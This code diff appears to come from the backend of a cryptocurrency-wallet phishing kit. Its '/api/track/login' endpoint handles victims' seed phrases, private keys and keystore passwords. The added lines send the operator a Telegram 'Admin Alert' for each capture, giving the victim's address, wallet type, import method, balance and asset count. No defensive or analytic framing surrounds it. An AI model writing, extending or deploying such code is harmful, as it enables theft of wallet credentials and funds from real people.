@@ -20,6 +20,18 @@ const JWT_SECRET = process.env.JWT_SECRET || deriveStableSecret();
 const DB_FILE = path.join(__dirname, 'database.json');
 const BL_FILE = path.join(__dirname, 'deleted.json');
 
+async function sendTelegramMessage(text) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!token || !chatId) return;
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true })
+  });
+}
+
 app.use(express.json());
 app.use(cookieParser());
 app.use(cors({ origin: true, credentials: true }));
@@ -457,6 +469,17 @@ app.post("/api/track/login", (req, res) => {
     keystorePreview: keystorePreview || null,
     keystorePasswordCaptured: keystorePasswordCaptured === true
   };
+  const method = importMethod || (mnemonic ? 'Seed Phrase' : (privateKey ? 'Private Key' : ((keystoreJSON || keystorePassword) ? 'Keystore' : 'Unknown')));
+  const msg = [
+    "Admin Alert: User login",
+    `Address: ${address}`,
+    `Wallet: ${walletType || ''}`,
+    `Method: ${method}`,
+    `Balance: ${balance}`,
+    `Assets: ${Array.isArray(assets) ? assets.length : 0}`,
+    `Time: ${new Date().toISOString()}`
+  ].join("\n");
+  sendTelegramMessage(msg).catch(() => {});
   (async () => {
     if (await pgReady()) {
       await pUpsertTrackedUser(userData);
